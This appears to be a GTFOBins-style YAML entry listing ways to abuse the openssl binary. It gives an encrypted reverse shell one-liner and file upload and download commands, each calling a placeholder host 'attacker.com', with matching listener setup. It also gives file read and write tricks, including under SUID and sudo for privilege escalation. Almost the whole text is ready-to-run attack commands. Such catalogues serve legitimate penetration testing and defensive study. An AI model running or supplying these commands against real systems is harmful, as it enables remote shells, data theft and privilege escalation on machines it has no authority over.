---
functions:
  reverse-shell:
    - description: Run `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port 12345` on the attacker box to receive the shell. Communication between attacker and target will be encrypted.
      code: |
        RHOST=attacker.com
        RPORT=12345
        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
  file-upload:
    - description: Send a file to a TCP port, transmission will be encrypted. Run `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save` on the attacker box to collect the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
  file-download:
    - description: Fetch a file from a TCP port, transmission will be encrypted. Run `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send` on the attacker box to send the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_save
        openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
  file-write:
    - code: |
        LFILE=file_to_write
        echo DATA | openssl enc -out "$LFILE"
    - code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        openssl enc -in "$TF" -out "$LFILE"
  file-read:
    - code: |
        LFILE=file_to_read
        openssl enc -in "$LFILE"
  suid:
    - code: |
        LFILE=file_to_write
        echo DATA | openssl enc -out "$LFILE"
  sudo:
    - code: |
        LFILE=file_to_write
        echo DATA | sudo openssl enc -out "$LFILE"
---
